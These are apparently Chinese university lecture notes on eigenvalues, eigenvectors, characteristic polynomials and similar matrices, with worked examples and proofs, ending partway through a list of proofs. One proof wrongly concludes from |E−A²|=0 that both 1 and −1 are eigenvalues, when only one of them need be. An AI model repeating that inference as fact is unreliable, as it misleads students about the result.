<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 9 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div></section><section class="print-page" id="note-la-eigenvalue" heading-number="2.3.1.4"><h1 id="note-la-eigenvalue--">讲义-特征值专题<a class="headerlink" href="#note-la-eigenvalue--" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 8170 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 28 分钟</p>
</div>
<blockquote>
<p>参考书目：《线性代数:未竟之美》</p>
<p>本讲义用于竺可桢学院线性代数线上辅学课程，奈何本人水平有限，有些地方在课程中可能表述不清晰，还请多多包涵。</p>
</blockquote>
<h2 id="note-la-eigenvalue-_1">引入<a class="headerlink" href="#note-la-eigenvalue-_1" title="Permanent link">&para;</a></h2>
<div class="admonition quote">
<p class="admonition-title">Quote</p>
<p>线性代数的一大目标是:我们希望找到出发空间和到达空间合适的基使得线性映射在这两组基下的表示更简单(尽可能多的零,尽量向对角矩阵靠近).我们将眼光放在线性变换，即出发空间和到达空间相同的线性映射，并且我们关注 <strong>出发空间与到达空间取同一组基的时候，如何取基，可以把同一个线性映射的矩阵尽可能表示得简单</strong> ；</p>
</div>
<div class="admonition summary">
<p class="admonition-title">基的转换&lt;-&gt;矩阵的转换</p>
<p>从矩阵在不同基下的的表示出发</p>
<p>假设我们有一个在 <span class="arithmatex">\(n\)</span> 维线性空间 <span class="arithmatex">\(\mathbf{V}\)</span> 上线性变换 <span class="arithmatex">\(\sigma\)</span> ,其在基 <span class="arithmatex">\(\mathbf{B}=\{\varepsilon_1,\varepsilon_2,\ldots,\varepsilon_n\}\)</span> (<span class="arithmatex">\(\mathbf{B}\)</span> 的每个列向量是都是一个基)下的矩阵为 <span class="arithmatex">\(A\)</span>,即</p>
<div class="arithmatex">\[
    \sigma (\varepsilon_1,\varepsilon_2,\ldots,\varepsilon_n) = (\varepsilon_1,\varepsilon_2,\ldots,\varepsilon_n)A
\]</div>
<p>假设我们很幸运,找到了另外一组基 <span class="arithmatex">\(\mathbf{B'}=\{\varepsilon_1',\varepsilon_2',\ldots,\varepsilon_n'\}\)</span>,并且已知这个线性映射在这组基下的矩阵很漂亮,是对角的<span class="arithmatex">\(\Lambda\)</span>,即</p>
<div class="arithmatex">\[
    \sigma (\varepsilon_1',\varepsilon_2',\ldots,\varepsilon_n') = (\varepsilon_1',\varepsilon_2',\ldots,\varepsilon_n') \Lambda
\]</div>
<p>如果又恰好知道两组基之间的过渡矩阵</p>
<div class="arithmatex">\[
\{\varepsilon_1',\varepsilon_2',\ldots,\varepsilon_n'\} = \{ \varepsilon_1,\varepsilon_2,\ldots,\varepsilon_n \} P
\]</div>
<p>那么我们可以推导出</p>
<div class="arithmatex">\[
     A P = P \Lambda \tag{1}
\]</div>
<div class="arithmatex">\[
    P^{-1} A P = \Lambda
\]</div>
<p><span class="arithmatex">\(P\)</span>为什么一定可逆？(基之间的互相表示)</p>
<p>继续由上面的式子(1)，我们展开,<span class="arithmatex">\(p_i\)</span>为矩阵<span class="arithmatex">\(P\)</span>的第<span class="arithmatex">\(i\)</span>个列向量</p>
<div class="arithmatex">\[
    A P = A ( p_1, p_2,\ldots,p_n ) = ( p_1, p_2,\ldots,p_n )\begin{pmatrix}
                \lambda_1 &amp; 0 &amp; 0 &amp; \cdots &amp; 0 \\
                0 &amp; \lambda_2 &amp; 0 &amp; \cdots &amp; 0 \\
                0 &amp; 0 &amp; \lambda_3 &amp; \cdots &amp; 0 \\
                \vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\
                0 &amp; 0 &amp; 0 &amp; \cdots &amp; \lambda_n
                \end{pmatrix}
\]</div>
<p>展开对应相等</p>
<div class="arithmatex">\[
    Ap_i = \lambda_i p_i
\]</div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>这一过程给我们的启发是，如果我们知道<span class="arithmatex">\(A\)</span>可以达到的对角化的矩阵是怎么样的,那么可以逆推出变换矩阵,从而找出这组基是怎么样的;上面的<span class="arithmatex">\(\lambda_i\)</span>,与<span class="arithmatex">\(p_i\)</span>就是我们今天要讨论的特征值与特征向量，如何寻找它们就是我们今天的重点；</p>
</div>
</div>
<h2 id="note-la-eigenvalue-_2">特征值与特征向量<a class="headerlink" href="#note-la-eigenvalue-_2" title="Permanent link">&para;</a></h2>
<h3 id="note-la-eigenvalue-_3">定义<a class="headerlink" href="#note-la-eigenvalue-_3" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>设<span class="arithmatex">\(\sigma\)</span>是线性空间<span class="arithmatex">\(V(\mathbf{F})\)</span>上的一个线性变换，如果存在数<span class="arithmatex">\(\lambda\in\mathbf{F}\)</span>和非零向量<span class="arithmatex">\(\xi\in V\)</span>使得<span class="arithmatex">\(\sigma(\xi)=\lambda\xi\)</span>，则称数<span class="arithmatex">\(\lambda\)</span>为<span class="arithmatex">\(\sigma\)</span>的一个特征值，并称非零向量<span class="arithmatex">\(\xi\)</span>为<span class="arithmatex">\(\sigma\)</span>属于其特征值<span class="arithmatex">\(\lambda\)</span>的特征向量</p>
<p>同构地，对于矩阵而言，有:</p>
<p>设矩阵<span class="arithmatex">\(A\in \mathbf{M}_n(\mathbf{F})\)</span>，如果存在数<span class="arithmatex">\(\lambda\in\mathbf{F}\)</span>和非零向量<span class="arithmatex">\(X\in\mathbf{F}^n\)</span>使得<span class="arithmatex">\(AX=\lambda X\)</span>，则称数<span class="arithmatex">\(\lambda\)</span>为<span class="arithmatex">\(A\)</span>的一个特征值，称非零向量<span class="arithmatex">\(X\)</span>为<span class="arithmatex">\(A\)</span>属于其特征值<span class="arithmatex">\(\lambda\)</span>的特征向量.</p>
</div>
<div class="admonition property">
<p class="admonition-title">Property</p>
<p>设 <span class="arithmatex">\(\sigma\)</span> 是 <span class="arithmatex">\(V(\mathbf{F})\)</span> 上的线性变换，<span class="arithmatex">\(I\)</span> 为恒等映射，则下述条件等价：</p>
<ol>
<li><span class="arithmatex">\(\lambda \in \mathbf{F}\)</span> 是 <span class="arithmatex">\(\sigma\)</span> 的特征值；</li>
<li><span class="arithmatex">\(\sigma - \lambda I\)</span> 不是单射 <span class="arithmatex">\(\Leftrightarrow\)</span> <span class="arithmatex">\(A-\lambda E\)</span> 列不满秩；</li>
<li><span class="arithmatex">\(\sigma - \lambda I\)</span> 不是满射 <span class="arithmatex">\(\Leftrightarrow\)</span> <span class="arithmatex">\(A-\lambda E\)</span> 行不满秩；</li>
<li><span class="arithmatex">\(\sigma - \lambda I\)</span> 不可逆  <span class="arithmatex">\(\Leftrightarrow\)</span>   <span class="arithmatex">\(A-\lambda E\)</span> 不可逆(<mark class="critic">行列式为0</mark>)</li>
</ol>
</div>
<p>对于第二第三条的矩阵版本有疑问的同学可以回顾 <strong>LALU</strong> 相抵标准型一节给出的定理:</p>
<p>线性映射是单射当且仅当其矩阵表示为列满秩矩阵,线性映射是满射当且仅当其矩阵表示为行满秩矩阵.</p>
<h3 id="note-la-eigenvalue-_4">特征多项式<a class="headerlink" href="#note-la-eigenvalue-_4" title="Permanent link">&para;</a></h3>
<p>由上述性质，<span class="arithmatex">\(\lambda\in\mathbf{F}\)</span>是<span class="arithmatex">\(\sigma\)</span>的特征值等价于<span class="arithmatex">\(|\lambda E-A|=0\)</span>，故我们可以通过<span class="arithmatex">\(|\lambda E-A|=0\)</span>求解特征值，其中<span class="arithmatex">\(A\)</span>为<span class="arithmatex">\(\sigma\)</span>在某组基下的矩阵，<span class="arithmatex">\(E\)</span>为单位矩阵. 对于特征向量的求解，求出<span class="arithmatex">\((\lambda E-A)X=0\)</span>的非零解就是特征向量在基<span class="arithmatex">\(\alpha_1,\ldots,\alpha_n\)</span>下的坐标，如果是矩阵的特征向量，那么<span class="arithmatex">\(X\)</span>就是解.</p>
<p>上述求解特征向量的方法需要我们求解<span class="arithmatex">\(f(\lambda)=|\lambda E-A|\)</span>的根，我们将<span class="arithmatex">\(f(\lambda)\)</span>称为<mark class="critic">特征多项式</mark>；</p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>设<span class="arithmatex">\(A=\begin{pmatrix}
     1 &amp; -1 &amp; 0 \\ 2 &amp; 0 &amp; 1 \\ 1 &amp; a &amp; 0
 \end{pmatrix}\)</span>，且存在非零向量<span class="arithmatex">\(\alpha\)</span>使得<span class="arithmatex">\(A\alpha=2\alpha\)</span>，求<span class="arithmatex">\(a\)</span>.</p>
<details class="answer">
<summary>Answer</summary>
<p>由题意知2是矩阵<span class="arithmatex">\(A\)</span>的特征值，因此我们有</p>
<div class="arithmatex">\[|2E-A|=\begin{vmatrix}
       1 &amp; 1 &amp; 0 \\ -2 &amp; 2 &amp; -1 \\ -1 &amp; -a &amp; 2
   \end{vmatrix}=9-a=0
\]</div>
<p>因此<span class="arithmatex">\(a=9\)</span>.</p>
</details>
</div>
<p>特征多项式可以写为以下的形式</p>
<p>对于<span class="arithmatex">\(n\)</span>级矩阵<span class="arithmatex">\(A=(a_{ij})\)</span>，记</p>
<div class="arithmatex">\[f(\lambda)=|\lambda E-A|=a_0\lambda^n+a_1\lambda^{n-1}+\cdots+a_{n-1}\lambda+a_n\]</div>
<p>则<span class="arithmatex">\(a_0=1\)</span>，<span class="arithmatex">\(a_1=-\mathbf{tr}(A)\)</span> ，<span class="arithmatex">\(a_n=(-1)^n|A|\)</span> ，且<span class="arithmatex">\(a_k\)</span>等于所有<span class="arithmatex">\(k\)</span>级主子式之和乘以<span class="arithmatex">\((-1)^k\)</span>.</p>
<p>由韦达定理</p>
<details class="note">
<summary>一元n次韦达定理</summary>
<p>设方程 <span class="arithmatex">\( a_0 x^n + a_{1} x^{n-1} + \cdots + a_{n-1} x + a_n = 0 \)</span> 有根 <span class="arithmatex">\( x_1, x_2, \ldots, x_n \)</span>. 那么:</p>
<ul>
<li>各根之和:</li>
</ul>
<div class="arithmatex">\[
x_1 + x_2 + \cdots + x_n = \sum_{i=1}^{n} x_i = -\frac{a_{1}}{a_0}
\]</div>
<ul>
<li>各根之积:</li>
</ul>
<div class="arithmatex">\[
x_1 x_2 \cdots x_n = \prod_{i=1}^{n} x_i = (-1)^n \frac{a_n}{a_0}
\]</div>
</details>
<ul>
<li>
<p><span class="arithmatex">\(\displaystyle\sum_{i=1}^{n}\lambda_i=\sum_{i=1}^{n}a_{ii}\)</span>；</p>
</li>
<li>
<p><span class="arithmatex">\(\displaystyle\prod_{i=1}^{n}\lambda_i=|A|\)</span>. </p>
</li>
</ul>
<h4 id="note-la-eigenvalue-_5">相似与特征多项式<a class="headerlink" href="#note-la-eigenvalue-_5" title="Permanent link">&para;</a></h4>
<div class="admonition question">
<p class="admonition-title">Question</p>
<ul>
<li>相似矩阵有相同的特征多项式?（从而有相同的迹，行列式，特征值;），即<span class="arithmatex">\(A\sim B\)</span>有<span class="arithmatex">\(|\lambda E-A|=|\lambda E-B|\)</span>吗？反过来呢？</li>
</ul>
<details class="answer">
<summary>Answer</summary>
<p>设<span class="arithmatex">\(B=P^{-1}AP\)</span>，则<span class="arithmatex">\(|\lambda E-B|=|\lambda E-P^{-1}AP|=|P^{-1}(\lambda E-A)P|=|P^{-1}||\lambda E-A||P|=|\lambda E-A|\)</span>. 因此<span class="arithmatex">\(A\sim B\)</span>有<span class="arithmatex">\(|\lambda E-A|=|\lambda E-B|\)</span>.</p>
<p>我们知道特征多项式相同则特征值相同，迹等于所有特征值之和，行列式等于所有特征值之积，因此相似矩阵有相同的迹，行列式，特征值.</p>
</details>
<ul>
<li>如果是，那么同一特征值的特征向量之间有什么关系？</li>
</ul>
<details class="answer">
<summary>Answer</summary>
<p>设<span class="arithmatex">\(P^{-1}AP=B\)</span>，则<span class="arithmatex">\(A,B\)</span>分别属于同一特征值<span class="arithmatex">\(\lambda\)</span>的特征向量<span class="arithmatex">\(X\)</span>和<span class="arithmatex">\(Y\)</span>满足<span class="arithmatex">\(Y=P^{-1}X\)</span>.</p>
<p>由<span class="arithmatex">\(AX=\lambda_0 X\)</span>以及<span class="arithmatex">\(A=PBP^{-1}\)</span>，我们有<span class="arithmatex">\(PBP^{-1}X=\lambda_0 X\)</span>，即<span class="arithmatex">\(BP^{-1}X=\lambda_0 P^{-1}X\)</span>，因此<span class="arithmatex">\(P^{-1}X\)</span>是<span class="arithmatex">\(B\)</span>属于<span class="arithmatex">\(\lambda_0\)</span>的特征向量，即<span class="arithmatex">\(P^{-1}X\)</span>是<span class="arithmatex">\(B\)</span>的特征向量，即<span class="arithmatex">\(Y=P^{-1}X\)</span>.</p>
<p>回忆<mark class="critic">基的选择导致同一向量在不同基下的坐标表示</mark>,实际上这个问题就是该定理的推论;</p>
<details class="info">
<summary>同一向量在不同基下的坐标表示</summary>
<p>设线性空间<span class="arithmatex">\(V\)</span>的两组基为<span class="arithmatex">\(B_1\)</span>和<span class="arithmatex">\(B_2\)</span>，且基<span class="arithmatex">\(B_1\)</span>到<span class="arithmatex">\(B_2\)</span>的变换矩阵（过渡矩阵）为<span class="arithmatex">\(A\)</span>，如果<span class="arithmatex">\(\xi \in V(\mathbf{F})\)</span>在<span class="arithmatex">\(B_1\)</span>和<span class="arithmatex">\(B_2\)</span>下的坐标分别为<span class="arithmatex">\(X\)</span>和<span class="arithmatex">\(Y\)</span>，则<span class="arithmatex">\(Y=A^{-1}X\)</span>.</p>
<div class="arithmatex">\[\xi=(\alpha_1,\ldots,\alpha_n)X=(\beta_1,\ldots,\beta_n)Y.\]</div>
<p>将过渡矩阵的条件<span class="arithmatex">\(B_2=B_1A\)</span>，即<span class="arithmatex">\((\beta_1,\ldots,\beta_n)=(\alpha_1,\ldots,\alpha_n)A\)</span>代入上式可得：</p>
<div class="arithmatex">\[\xi=(\alpha_1,\ldots,\alpha_n)X=(\alpha_1,\ldots,\alpha_n)AY.\]</div>
<p>又由于<span class="arithmatex">\(\xi\)</span>在线性无关向量组<span class="arithmatex">\(\alpha_1,\ldots,\alpha_n\)</span>下的坐标唯一，故我们有<span class="arithmatex">\(X=AY\)</span>，即<span class="arithmatex">\(Y=A^{-1}X\)</span>.</p>
</details>
</details>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>回答以下两个问题：</p>
<ol>
<li>
<p>设 <span class="arithmatex">\(A,B\)</span> 均为 <span class="arithmatex">\(n\)</span> 阶矩阵，证明：<span class="arithmatex">\(\lambda\neq 0\)</span> 是 <span class="arithmatex">\(AB\)</span> 的特征值，则 <span class="arithmatex">\(\lambda\)</span> 也是 <span class="arithmatex">\(BA\)</span> 的特征值；</p>
</li>
<li>
<p>设 <span class="arithmatex">\(A\in \mathbf{M}_{m\times n}(\mathbf{C}),\enspace B\in \mathbf{M}_{n\times m}(\mathbf{C})\)</span>，证明：</p>
</li>
</ol>
<div class="arithmatex">\[
   \begin{pmatrix}
       AB &amp; O \\ B &amp; O
   \end{pmatrix} \sim \begin{pmatrix}
       O &amp; O \\ B &amp; BA
   \end{pmatrix}
\]</div>
<p>并由此推出 <span class="arithmatex">\(AB\)</span> 和 <span class="arithmatex">\(BA\)</span> 非零特征值相同，且 <span class="arithmatex">\(m=n\)</span> 时有 <span class="arithmatex">\(|\lambda E-AB|=|\lambda E-BA|\)</span>.</p>
<details class="proof">
<summary>Proof</summary>
<ol>
<li>设 <span class="arithmatex">\(X\)</span> 是 <span class="arithmatex">\(AB\)</span> 属于 <span class="arithmatex">\(\lambda\)</span> 的特征向量，则 <span class="arithmatex">\(ABX=\lambda X\)</span>，因此 <span class="arithmatex">\(B(ABX)=B(\lambda X)\)</span>，即 <span class="arithmatex">\((BA)(BX)=\lambda(BX)\)</span>，因此 <span class="arithmatex">\(BX\)</span> 是 <span class="arithmatex">\(BA\)</span> 属于 <span class="arithmatex">\(\lambda\)</span> 的特征向量，故 <span class="arithmatex">\(\lambda\)</span> 也是 <span class="arithmatex">\(BA\)</span> 的特征值。</li>
</ol>
<p>实际上这里还有一点需要说明，就是 <span class="arithmatex">\(BX\neq 0\)</span>，否则它将不能作为特征向量。事实上证明是简单的，假设 <span class="arithmatex">\(BX=0\)</span>，则 <span class="arithmatex">\(ABX=0\)</span>，由于 <span class="arithmatex">\(\lambda\neq 0\)</span>，因此必然有 <span class="arithmatex">\(X=0\)</span>，但这与 <span class="arithmatex">\(X\)</span> 是 <span class="arithmatex">\(AB\)</span> 属于 <span class="arithmatex">\(\lambda\)</span> 的特征向量矛盾，因此 <span class="arithmatex">\(BX\neq 0\)</span>。</p>
<ol>
<li>根据分块矩阵初等变换的性质，我们可以通过不断尝试选取到 <span class="arithmatex">\(P=\begin{pmatrix}
     E_m &amp; A \\ O &amp; E_n
   \end{pmatrix}\)</span>，其逆矩阵为 <span class="arithmatex">\(P^{-1}=\begin{pmatrix}
     E_m &amp; -A \\ O &amp; E_n
 \end{pmatrix}\)</span>，我们发现恰有</li>
</ol>
<div class="arithmatex">\[
    \begin{pmatrix}
        E_m &amp; -A \\ O &amp; E_n
    \end{pmatrix} \begin{pmatrix}
        AB &amp; O \\ B &amp; O
    \end{pmatrix} \begin{pmatrix}
        E_m &amp; A \\ O &amp; E_n
    \end{pmatrix} = \begin{pmatrix}
        O &amp; O \\ B &amp; BA
    \end{pmatrix}.
\]</div>
<p>因此 <span class="arithmatex">\(\begin{pmatrix}
     AB &amp; O \\ B &amp; O
 \end{pmatrix}\)</span> 与 <span class="arithmatex">\(\begin{pmatrix}
     O &amp; O \\ B &amp; BA
 \end{pmatrix}\)</span> 相似，因此它们的特征多项式相同，即</p>
<div class="arithmatex">\[
 \begin{vmatrix}
     \lambda E_m-AB &amp; O \\ -B &amp; \lambda E_n
 \end{vmatrix} = \begin{vmatrix}
     \lambda E_m &amp; O \\ -B &amp; \lambda E_n-BA
 \end{vmatrix}.
\]</div>
<p>根据行列式的计算性质 <span class="arithmatex">\(\begin{vmatrix}
     A &amp; O \\ C &amp; B
 \end{vmatrix} = |A||B|\)</span>，我们有</p>
<div class="arithmatex">\[
 |\lambda E_m-AB||\lambda E_n| = |\lambda E_m||\lambda E_n-BA|,
\]</div>
<p>即 <span class="arithmatex">\(\lambda^n|\lambda E_m-AB| = \lambda^m|\lambda E_n-BA|\)</span>，因此 <span class="arithmatex">\(AB\)</span> 和 <span class="arithmatex">\(BA\)</span> 非零特征值相同，且 <span class="arithmatex">\(m=n\)</span> 时有 <span class="arithmatex">\(|\lambda E-AB|=|\lambda E-BA|\)</span>.</p>
</details>
</div>
<p>对于可逆矩阵<span class="arithmatex">\(P\)</span>,我们知道了<span class="arithmatex">\(A\)</span>与<span class="arithmatex">\(B=P^{-1}AP\)</span>有相同的特征值，如果<span class="arithmatex">\(P\)</span>不可逆，两个矩阵又有什么关系呢？</p>
<p>我们有以下结论</p>
<div class="admonition property">
<p class="admonition-title">Property</p>
<p>设<span class="arithmatex">\(A,B\)</span>分别为数域<span class="arithmatex">\(\mathbf{F}\)</span>上<span class="arithmatex">\(n\)</span>阶、<span class="arithmatex">\(m\)</span>阶方阵，<span class="arithmatex">\(A,B\)</span>有<span class="arithmatex">\(r\)</span>个两两不等的公共特征值，则矩阵方程<span class="arithmatex">\(AX-XB=O\)</span>有秩为<span class="arithmatex">\(r\)</span>的矩阵解. 反之，若数域为复数域，矩阵方程<span class="arithmatex">\(AX-XB=O\)</span>有秩为<span class="arithmatex">\(r\)</span>的矩阵解，则<span class="arithmatex">\(A,B\)</span>至少有<span class="arithmatex">\(r\)</span>个公共的特征值（计重数）.</p>
<p>证明见 《LALU》.P465</p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>设<span class="arithmatex">\(m\)</span>阶矩阵<span class="arithmatex">\(A\)</span>与<span class="arithmatex">\(n\)</span>阶矩阵<span class="arithmatex">\(B\)</span>无公共复特征值，<span class="arithmatex">\(C\)</span>为<span class="arithmatex">\(m\times n\)</span>矩阵，则矩阵方程<span class="arithmatex">\(AX-XB=C\)</span>存在唯一解.</p>
<details class="answer">
<summary>Answer</summary>
<p>设<span class="arithmatex">\(V\)</span>是所有<span class="arithmatex">\(m\times n\)</span>矩阵构成的线性空间，定义<span class="arithmatex">\(V\)</span>上的线性变换<span class="arithmatex">\(\sigma(X)=AX-XB,\enspace X\in V\)</span>. 由于<span class="arithmatex">\(A\)</span>和<span class="arithmatex">\(B\)</span>无公共复特征值，所以<span class="arithmatex">\(\sigma(X)=AX-XB=O\)</span>只有零解，即<span class="arithmatex">\(\sigma\)</span>为<span class="arithmatex">\(V\)</span>上单射，可知<span class="arithmatex">\(\sigma\)</span>是满射且是同构映射. 于是，对任意的<span class="arithmatex">\(C\in V\)</span>，都存在唯一的<span class="arithmatex">\(X_0\in V\)</span>使得<span class="arithmatex">\(\sigma(X_0)=C\)</span>，即矩阵方程<span class="arithmatex">\(AX-XB=C\)</span>存在唯一解<span class="arithmatex">\(X_0\)</span>.</p>
</details>
</div>
<h3 id="note-la-eigenvalue-_6">特征值的性质与结论<a class="headerlink" href="#note-la-eigenvalue-_6" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>设<span class="arithmatex">\(\lambda\)</span>是线性空间<span class="arithmatex">\(V(\mathbf{F})\)</span>上的线性变换<span class="arithmatex">\(\sigma\)</span>的特征值，<span class="arithmatex">\(\xi\)</span>是<span class="arithmatex">\(\sigma\)</span>属于<span class="arithmatex">\(\lambda\)</span>的特征向量，则</p>
<ul>
<li>
<p><span class="arithmatex">\(k\lambda\)</span>是<span class="arithmatex">\(k\sigma\)</span>的特征值，<span class="arithmatex">\(\lambda^m\)</span>是<span class="arithmatex">\(\sigma^m\)</span>的特征值，且<span class="arithmatex">\(\xi\)</span>仍是相应特征向量；</p>
</li>
<li>
<p>若<span class="arithmatex">\(f(x)=a_nx^n+a_{n-1}x^{n-1}+\cdots+a_1x+a_0\)</span>是<span class="arithmatex">\(\mathbf{F}\)</span>上的多项式，则<span class="arithmatex">\(f(\sigma)(\xi)=f(\lambda)\xi\)</span>；</p>
</li>
</ul>
</li>
<li>
<p>设<span class="arithmatex">\(\lambda\)</span>是<span class="arithmatex">\(n\)</span>阶矩阵<span class="arithmatex">\(A\)</span>的特征值，<span class="arithmatex">\(A\)</span>可逆，则<span class="arithmatex">\(\lambda^{-1}\)</span>是<span class="arithmatex">\(A^{-1}\)</span>的特征值，<span class="arithmatex">\(|A|\lambda^{-1}\)</span>是<span class="arithmatex">\(A\)</span>的伴随矩阵<span class="arithmatex">\(A^*\)</span>的特征值，且特征向量不变.</p>
</li>
<li>
<p>设<span class="arithmatex">\(A\)</span>为<span class="arithmatex">\(n\)</span>阶矩阵，则<span class="arithmatex">\(A\)</span>与<span class="arithmatex">\(A^\mathrm{T}\)</span>有相同的特征值（含重数）.</p>
</li>
<li>
<p><span class="arithmatex">\(A\)</span>可逆/<span class="arithmatex">\(A\)</span>不可逆/<span class="arithmatex">\(E+A\)</span>可逆/<span class="arithmatex">\(4E+A\)</span>不可逆；</p>
</li>
<li>
<p><span class="arithmatex">\(|E-A^2|=0\)</span>；</p>
</li>
<li>
<p><span class="arithmatex">\(A^2=E\)</span>（对合）/<span class="arithmatex">\(A^2=A\)</span>（幂等）/<span class="arithmatex">\(A^k=0\)</span>（幂零）；</p>
</li>
<li>
<p><span class="arithmatex">\(A=\lambda_0E+B\)</span>（<span class="arithmatex">\(\lambda_0\)</span>为常数，且已知<span class="arithmatex">\(B\)</span>的<span class="arithmatex">\(n\)</span>个特征值为<span class="arithmatex">\(\lambda_1,\lambda_2,\ldots,\lambda_n\)</span>）；</p>
</li>
<li>
<p><span class="arithmatex">\(A\)</span>为对角块矩阵，即<span class="arithmatex">\(A=\mathbf{diag}(A_1,A_2,\ldots,A_m)\)</span>.</p>
</li>
</ul>
<details class="proof">
<summary>Proof</summary>
<p>1 
<strong>由于</strong><span class="arithmatex">\(\sigma(\xi) = \lambda\xi\)</span>，则<span class="arithmatex">\((k\sigma)(\xi) = k\lambda\xi\)</span>，即<span class="arithmatex">\(k\lambda\)</span>是<span class="arithmatex">\(k\sigma\)</span>的特征值，<span class="arithmatex">\(\xi\)</span>仍是相应特征向量。</p>
<p>而<span class="arithmatex">\(\sigma^m(\xi) = \sigma^{m-1}(\sigma(\xi)) = \sigma^{m-1}(\lambda\xi) = \lambda\sigma^{m-1}(\xi) = \cdots = \lambda^m\xi\)</span>，即<span class="arithmatex">\(\lambda^m\)</span>是<span class="arithmatex">\(\sigma^m\)</span>的特征值，<span class="arithmatex">\(\xi\)</span>仍是相应特征向量。</p>
<p>2 
<strong>利用前述<span class="arithmatex">\(\sigma^m\)</span>的相关性质，我们有</strong><br />
   $$ f(\sigma)(\xi) = (a_n\sigma^n + a_{n-1}\sigma^{n-1} + \cdots + a_1\sigma + a_0I)(\xi) $$<br />
   $$ = a_n\sigma^n(\xi) + a_{n-1}\sigma^{n-1}(\xi) + \cdots + a_1\sigma(\xi) + a_0I(\xi) $$<br />
   $$ = a_n\lambda^n\xi + a_{n-1}\lambda^{n-1}\xi + \cdots + a_1\lambda\xi + a_0\xi $$<br />
   $$ = f(\lambda)\xi. $$</p>
<p>3 
<strong>设<span class="arithmatex">\(\xi\)</span>是<span class="arithmatex">\(A\)</span>的特征值，即<span class="arithmatex">\(A\xi = \lambda\xi\)</span>，则<span class="arithmatex">\(\xi = A^{-1}A\xi = A^{-1}\lambda\xi\)</span>，即<span class="arithmatex">\(A^{-1}\xi = \lambda^{-1}\xi\)</span>，因此<span class="arithmatex">\(\lambda^{-1}\)</span>是<span class="arithmatex">\(A^{-1}\)</span>的特征值，<span class="arithmatex">\(\xi\)</span>仍是相应特征向量。</strong></p>
<p>又由于<span class="arithmatex">\(A\)</span>可逆时<span class="arithmatex">\(A^* = |A|A^{-1}\)</span>，根据前面关于<span class="arithmatex">\(k\sigma\)</span>和<span class="arithmatex">\(A^{-1}\)</span>特征值的讨论可知，<span class="arithmatex">\(|A|\lambda^{-1}\)</span>是<span class="arithmatex">\(A\)</span>的伴随矩阵<span class="arithmatex">\(A^*\)</span>的特征值，<span class="arithmatex">\(\xi\)</span>仍是相应特征向量。</p>
<p>4
 <strong>我们用特征多项式证明</strong>。实际情况是，<span class="arithmatex">\(A^\mathrm{T}\)</span>的特征多项式为<span class="arithmatex">\(|\lambda E - A^\mathrm{T}| = |(\lambda E - A)^\mathrm{T}| = |\lambda E - A|\)</span>（回忆转置不改变行列式），实际上与<span class="arithmatex">\(A\)</span>的特征多项式完全一致，因此<span class="arithmatex">\(A^\mathrm{T}\)</span>与<span class="arithmatex">\(A\)</span>有相同的特征值（含重数）。</p>
<p>5
 <strong><span class="arithmatex">\(A\)</span>可逆时有</strong> <span class="arithmatex">\(|A| = \lambda_1 \cdots \lambda_n \neq 0\)</span>，因此<span class="arithmatex">\(A\)</span>的特征值都不为0。 同理，<span class="arithmatex">\(A\)</span>不可逆同理表明存在特征值等于0，<span class="arithmatex">\(E+A\)</span>可逆表明<span class="arithmatex">\(-1\)</span>不是<span class="arithmatex">\(A\)</span>的特征值，<span class="arithmatex">\(4E+A\)</span>不可逆表明<span class="arithmatex">\(-4\)</span>是<span class="arithmatex">\(A\)</span>的特征值。</p>
<p>6
 <strong><span class="arithmatex">\(|E - A^2| = |E - A||E + A| = 0\)</span></strong>，因此<span class="arithmatex">\(\pm 1\)</span>都是<span class="arithmatex">\(A\)</span>的特征值。</p>
<p>7
 <strong>我们首先考虑对合矩阵，接下来的同理可以得到类似结论</strong>。由于<span class="arithmatex">\(A^2 = E\)</span>，设<span class="arithmatex">\(AX = \lambda X\)</span>，则<span class="arithmatex">\(A^2 X = \lambda^2 X = X\)</span>，因此<span class="arithmatex">\(\lambda^2 = 1\)</span>，即<span class="arithmatex">\(\lambda = \pm 1\)</span>，因此<span class="arithmatex">\(1\)</span>或<span class="arithmatex">\(-1\)</span>是<span class="arithmatex">\(A\)</span>的特征值。</p>
